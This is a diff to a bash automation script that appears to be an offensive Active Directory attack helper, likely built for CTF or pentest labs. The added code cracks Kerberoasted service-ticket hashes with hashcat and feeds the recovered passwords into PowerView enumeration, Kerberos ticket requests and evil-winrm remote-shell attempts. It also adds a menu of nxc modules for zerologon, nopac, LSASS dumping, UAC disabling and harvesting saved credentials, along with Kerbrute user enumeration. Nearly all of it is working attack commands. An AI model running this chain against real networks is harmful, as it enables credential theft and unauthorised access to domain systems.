@@ -13,8 +13,379 @@ echo -e "\e[1;32m
                 /____/                                 /____/    
                                                             \e[0m""\e[1;38m0x2034\e[0m"
 
+getuserspns1_check1(){
+      cat << 'EOF' >> /tmp/auto7.sh
+         getuserspns1_check(){
+            gnome-terminal -- bash -c "
+export DC='__$DC__'
+export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
+export Ip='__$Ip__'
+export Kerberos='__$Kerberos__'
 
+i=\$(cat /tmp/.current_iii.txt)
+HASH_FILE=\"/tmp/.getuserspn-req11.txt.\$i\"
 
+WORDLIST='/usr/share/wordlists/rockyou.txt'
+
+echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
+echo ''
+while pgrep -x hashcat > /dev/null; do
+    echo 'Hashcat is still running, waiting...'
+    sleep 10
+done
+hashcat -m 13100 \$HASH_FILE \$WORDLIST
+echo ''
+
+cracked=\$(hashcat -m 13100 --show \$HASH_FILE)
+
+if [ -n \"\$cracked\" ]; then
+    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
+    echo ''
+    echo \"\$cracked\"
+    echo ''
+
+    echo \"\$cracked\" | grep -v 'Separator' | while IFS= read -r line; do
+        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
+        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
+        cat << EOT > /tmp/spn_req1.sh
+#!/bin/bash
+
+gnome-terminal -- expect -c \"
+spawn s -t
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
+interact
+\"
+EOT
+        chmod +x /tmp/spn_req1.sh
+        bash /tmp/spn_req1.sh
+        gnome-terminal -- bash -c \"
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export user='$user'
+export p='$p'
+
+echo -e '\e[1;32m[+] User: \$user\e[0m'
+echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
+echo ''
+echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
+echo ''
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo ''
+echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
+exec bash\"  
+        gnome-terminal -- bash -c '
+export DC='__$DC__'
+export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
+export Ip='__$Ip__'
+user=\"'\$user'\"
+p=\"'\$p'\"
+
+echo -e \"\e[1;32m[+] User: \$user\e[0m\"
+echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
+
+echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
+echo \"\"
+echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
+echo \"\"  
+evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
+
+if [ \$? -ne 0 ]; then
+    echo \"\"
+    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
+    echo \"\"
+
+    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+    echo \"\"
+
+    if [ -f \"\${user}.ccache\" ]; then
+        export KRB5CCNAME=\$PWD/\${user}.ccache
+        echo \"\"
+        echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
+        echo \"\"  
+        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
+        if [ \$? -ne 0 ]; then
+            echo \"\"
+            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
+            echo \"\"
+        fi
+    else
+        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
+        echo \"\"
+    fi
+fi
+exec bash'
+    done
+else
+    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
+fi
+
+exec bash
+"
+
+}
+EOF
+
+}
+getuserspns1_check(){
+      gnome-terminal -- bash -c "
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export Ip='$Ip'
+export Kerberos='$Kerberos'
+
+ii=\$(cat /tmp/.current_ii.txt)
+HASH_FILE=\"/tmp/.getuserspn-req.txt.\$ii\"
+WORDLIST='/usr/share/wordlists/rockyou.txt'
+
+echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
+echo ''
+while pgrep -x hashcat > /dev/null; do
+    echo 'Hashcat is still running, waiting...'
+    sleep 10
+done
+hashcat -m 13100 \$HASH_FILE \$WORDLIST
+echo ''
+
+cracked=\$(hashcat -m 13100 --show \$HASH_FILE)
+
+if [ -n \"\$cracked\" ]; then
+    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
+    echo ''
+    echo \"\$cracked\"
+    echo ''
+
+    echo \"\$cracked\" | grep -v 'Separator unmatched' | while IFS= read -r line; do
+        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
+        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
+        cat << EOF > /tmp/spn_req.sh
+#!/bin/bash
+
+gnome-terminal -- expect -c \"
+spawn s -t
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
+interact
+\"
+EOF
+        chmod +x /tmp/spn_req.sh
+        bash /tmp/spn_req.sh
+        gnome-terminal -- bash -c \"
+export DC='$DC'
+export CLEAN_DOMAIN='$CLEAN_DOMAIN'
+export user='$user'
+export p='$p'
+
+echo -e '\e[1;32m[+] User: \$user\e[0m'
+echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
+echo ''
+echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
+echo ''
+getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+export KRB5CCNAME=\$PWD/\${user}.ccache
+echo ''
+echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
+echo ''
+expect -c \\\"set timeout -1
+set send_slow {1 .001}
+spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC -k
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
+interact\\\"
+echo ''
+echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
+exec bash\"  
+        gnome-terminal -- bash -c '
+export DC=\"'$DC'\"
+export CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
+export Ip=\"'$Ip'\"
+user=\"'\$user'\"
+p=\"'\$p'\"
+
+echo -e \"\e[1;32m[+] User: \$user\e[0m\"
+echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
+
+echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
+echo ''
+echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
+echo ''
+evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
+
+if [ \$? -ne 0 ]; then
+    echo \"\"
+    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
+    echo \"\"
+
+    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
+    echo \"\"
+
+    if [ -f \"\${user}.ccache\" ]; then
+        export KRB5CCNAME=\$PWD/\${user}.ccache
+        echo \"\"
+        echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
+        echo ''   
+        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
+        if [ \$? -ne 0 ]; then
+            echo \"\"
+            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
+            echo \"\"
+        fi
+    else
+        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
+        echo \"\"
+    fi
+fi
+exec bash'
+    done
+else
+    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
+fi
+
+exec bash
+"
+}
 getuserspns_check1(){
       cat << 'EOF' >> /tmp/auto5.sh
          getuserspns_check(){
@@ -1223,18 +1594,26 @@ exec bash"
        gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Windsearch on $DOMAIN --[+]\e[0m' ; echo "" ; python3 $HOME/Downloads/tools/Folders/Windapsearch/windapsearch.py -U --full --dc-ip $DOMAIN ; exec bash"         
     fi
     echo "--------------------------"
+    if nc -zv -w 5 $DOMAIN 6379 2>/dev/null || nc -zvu -w 5 $DOMAIN 6379 2>/dev/null; then
+        gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Redis-Cli on $DOMAIN --[+]\e[0m' ; echo "" ; redis-cli -h $DOMAIN ; exec bash"         
+    fi 
+    echo "--------------------------"
+    if nc -zuv -w 5 $DOMAIN 69 2>/dev/null; then
+        gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TFTP on $DOMAIN --[+]\e[0m' ; echo "" ; tftp $DOMAIN ; exec bash"
+    fi
+    echo "--------------------------" 
     if nc -zv -w 5 $DOMAIN 88 2>/dev/null; then
        echo ""
        echo -e "\e[1;32m[+]-- Kerbrute on $DOMAIN --[+]\e[0m"
        echo ""
-       if  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $HOSTS_ENTRY /usr/share/wordlists/rockyou.txt
+       if  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $HOSTS_ENTRY /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
        then
            :
-       elif  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $DOMAIN /usr/share/wordlists/rockyou.txt
+       elif  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
        then
            :
        else
-             $HOME/Downloads/tools/Files/Kerbrute userenum -d $HOSTS_ENTRY --dc $HOSTS_ENTRY /usr/share/wordlists/rockyou.txt   
+             $HOME/Downloads/tools/Files/Kerbrute userenum -d $HOSTS_ENTRY --dc $HOSTS_ENTRY /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
        fi
     fi
 fi
@@ -1503,9 +1882,9 @@ main(){
         then
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
             web_1 
             network 
@@ -1513,9 +1892,9 @@ gnome-terminal -- bash -c "
             nmap -A -vv -Pn $DOMAIN
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
             web_1   
             network 
@@ -1526,9 +1905,9 @@ gnome-terminal -- bash -c "
             then 
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
                 web_1  
                 network  
@@ -1536,9 +1915,9 @@ gnome-terminal -- bash -c "
                 nmap -A -vv -Pn $DOMAIN
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
                 web_1   
                 network 
@@ -1550,9 +1929,9 @@ gnome-terminal -- bash -c "
                if [ "$flag_6" = true ]; then
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
                   web_1  
                   network 
@@ -1560,9 +1939,9 @@ gnome-terminal -- bash -c "
                   nmap -A -vv -Pn $DOMAIN
 gnome-terminal -- bash -c "
   echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
-  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5; exec bash\";
+  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
   echo '';
-  nmap $DOMAIN -Pn -p- -T5;
+  nmap $DOMAIN -Pn -p- -T5 -vv ;
   exec bash"
                   web_1     
                   network 
@@ -1645,49 +2024,52 @@ tools(){
           2) nxc smb domain -u 'user' -p 'password' --users
           3) nxc smb domain -u 'user' -p 'password' --rid-brute
           4) nxc smb domain -u 'user' -p 'password' --shares
-          5) nxc smb domain -u 'user' -p 'password' --loggedon-users
-          6) nxc smb domain -u 'user' -p 'password' -M enum_av
-          7) nxc winrm domain -u 'user' -p 'password'
-          8) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
-          9) nxc smb domain --generate-krb5-file domain-krb5.conf
-          10) nxc smb domain -u 'user' -p 'password' -M timeroast 
-          11) nxc smb domain -u "user" -p 'password' --pass-pol
-          12) nxc ldap domain -u 'user' -p 'password' --groups
-          13) nxc ldap domain -u 'user' -p 'password' --computers
-          14) nxc ldap domain -u 'user' -p 'password' --get-sid
-          15) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
-          16) nxc ldap domain -u 'user' -p 'password' -M maq
-          17) nxc smb domain -u 'user' -p 'password' -M zerologon
-          18) nxc smb domain -u 'user' -p 'password' -M coerce_plus
-          19) nxc smb domain -u 'user' -p 'password' -M nopac
-          20) nxc smb domain -u 'user' -p 'password' -M gpp_password 
-          21) nxc smb domain -u 'user' -p 'password' -M lsassy
-          22) nxc ldap domain -u 'user' -p 'password' -M subnets
-          23) nxc ldap domain -u 'user' -p 'password' -M pre2k
-          24) nxc ldap domain -u 'user' -p 'password' -M laps
-          25) nxc ldap domain -u 'user' -p 'password' -M pso
-          26) nxc ldap domain -u 'user' -p 'password' -M adcs
-          27) nxc smb domain -u 'user' -p 'password' -M enum_ca
-          28) nxc smb domain -u 'user' -p 'password' -M bitlocker
-          29) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
-          30) nxc smb domain -u 'user' -p 'password' -M nanodump
-          31) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
-          32) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
-          33) nxc smb domain -u 'user' -p 'password' -M backup_operator
-          34) nxc smb domain -u 'user' -p 'password' -M keepass_discover
-          35) nxc smb domain -u 'user' -p 'password' -M powershell_history
-          36) nxc smb domain -u 'user' -p 'password' -M recent_files
-          37) nxc smb domain -u 'user' -p 'password' -M winscp
-          38) nxc smb domain -u 'user' -p 'password' -M teams_localdb
-          39) nxc smb domain -u 'user' -p 'password' -M mremoteng
-          40) nxc smb domain -u 'user' -p 'password' -M mobaxterm
-          41) nxc smb domain -u 'user' -p 'password' -M putty
-          42) nxc smb domain -u 'user' -p 'password' -M rdcman
-          43) nxc smb domain -u 'user' -p 'password' -M wifi
-          44) nxc smb domain -u 'user' -p 'password' --dpapi 
-          45) nxc ldap domain -u 'user' -p 'password' --gmsa
-          46) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
-       \e[0m"
+          5) nxc smb domain -u 'user' -p 'password' -M spider_plus 
+          6) nxc smb domain -u 'user' -p 'password' --loggedon-users
+          7) nxc smb domain -u 'user' -p 'password' -M enum_av
+          8) nxc winrm domain -u 'user' -p 'password'
+          9) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
+          10) nxc smb domain --generate-krb5-file domain-krb5.conf
+          11) nxc smb domain -u 'user' -p 'password' -M timeroast 
+          12) nxc smb domain -u "user" -p 'password' --pass-pol
+          13) nxc ldap domain -u 'user' -p 'password' --groups
+          14) nxc ldap domain -u 'user' -p 'password' --computers
+          15) nxc ldap domain -u 'user' -p 'password' --get-sid
+          16) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
+          17) nxc ldap domain -u 'user' -p 'password' -M maq
+          18) nxc smb domain -u 'user' -p 'password' -M zerologon
+          19) nxc smb domain -u 'user' -p 'password' -M coerce_plus
+          20) nxc smb domain -u 'user' -p 'password' -M nopac
+          21) nxc smb domain -u 'user' -p 'password' -M gpp_password 
+          22) nxc smb domain -u 'user' -p 'password' -M lsassy
+          23) nxc ldap domain -u 'user' -p 'password' -M subnets
+          24) nxc ldap domain -u 'user' -p 'password' -M pre2k
+          25) nxc ldap domain -u 'user' -p 'password' -M laps
+          26) nxc ldap domain -u 'user' -p 'password' -M pso
+          27) nxc ldap domain -u 'user' -p 'password' -M adcs
+          28) nxc smb domain -u 'user' -p 'password' -M enum_ca
+          29) nxc smb domain -u 'user' -p 'password' -M bitlocker
+          30) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
+          31) nxc smb domain -u 'user' -p 'password' -M nanodump
+          32) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
+          33) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
+          34) nxc smb domain -u 'user' -p 'password' -M backup_operator
+          35) nxc smb domain -u 'user' -p 'password' -M keepass_discover
+          36) nxc smb domain -u 'user' -p 'password' -M powershell_history
+          37) nxc smb domain -u 'user' -p 'password' -M recent_files
+          38) nxc smb domain -u 'user' -p 'password' -M winscp
+          39) nxc smb domain -u 'user' -p 'password' -M teams_localdb
+          40) nxc smb domain -u 'user' -p 'password' -M mremoteng
+          41) nxc smb domain -u 'user' -p 'password' -M mobaxterm
+          42) nxc smb domain -u 'user' -p 'password' -M putty
+          43) nxc smb domain -u 'user' -p 'password' -M rdcman
+          44) nxc smb domain -u 'user' -p 'password' -M wifi
+          45) nxc smb domain -u 'user' -p 'password' --dpapi 
+          46) nxc ldap domain -u 'user' -p 'password' --gmsa
+	  47) nxc ldap domain -u 'user' -p 'password' --trusted-for-delegation
+	  48) nxc ldap domain -u 'user' -p 'password' -M ldap-checker
+          49) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
+       \e[0m" 
      ;;
   esac 
   case "${1,,}" in
@@ -1796,6 +2178,7 @@ if [[ "$1" == "-t" ]]; then
 	   8) getTGT.py
 	   9) evil-winrm
            10) Powerview
+           11) findDelegation.py
        \033[0m"
        echo ""
        read_input tool $'\033[35m# \033[0m'
